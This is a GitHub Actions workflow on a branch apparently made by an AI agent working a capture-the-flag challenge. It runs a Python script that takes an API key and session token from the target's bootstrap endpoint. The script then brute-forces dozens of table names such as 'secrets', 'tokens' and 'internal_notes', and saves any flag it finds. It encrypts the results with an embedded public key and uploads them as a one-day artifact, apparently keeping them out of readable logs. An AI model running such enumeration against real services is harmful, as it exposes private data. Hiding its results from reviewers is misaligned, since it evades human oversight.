name: launchlet-part3-tables

on:
  push:
    branches: [agent/launchlet-part2-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe semantic Data API tables and encrypt results
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, urllib.parse, json, pathlib, re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          out=pathlib.Path('package/out')
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
          h={'Accept':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session']}
          root=urllib.parse.urljoin(base,boot['api']['dataApiBase'].rstrip('/')+'/')
          words=['deploy_notes','deployment_notes','release_notes','build_notes','artifact_notes','preview_notes','internal_notes','audit_notes','launch_notes','project_notes','deployments','deployment','deploys','releases','release','artifacts','artifact','builds','build','projects','project','workspaces','workspace','receipts','build_receipts','deploy_receipts','release_receipts','preview_receipts','deploy_refs','deployment_refs','release_queue','deploy_queue','publish_queue','promotion_queue','corporate_release','enterprise_rollout','release_pulse','deploy_inspector','deploy_exports','deployment_exports','release_exports','exports','export_jobs','deploy_jobs','jobs','actions','server_actions','action_refs','capabilities','tokens','secrets','flags','audit','activity','activities','events','changelog','customer_notes','feedback','risks']
          hits=[]
          for table in words:
            for suffix in ['', '?select=*', '?select=*&workspace_id=eq.ws-launchlet-internal&workspace_id=eq.ws-launchlet-public']:
              try:
                r=s.get(root+table+suffix,headers=h,timeout=8,allow_redirects=False)
              except Exception as e:
                hits.append({'table':table,'suffix':suffix,'error':repr(e)}); continue
              if not (r.status_code==404 and r.text=='{"error":"not_found"}'):
                hits.append({'table':table,'suffix':suffix,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                if re.search(r'caplag\{[^}]+\}',r.text): (out/'FOUND.txt').write_text(r.text)
          (out/'summary.json').write_text(json.dumps(hits,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"
          IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-tables-encrypted
          path: artifact/
          retention-days: 1
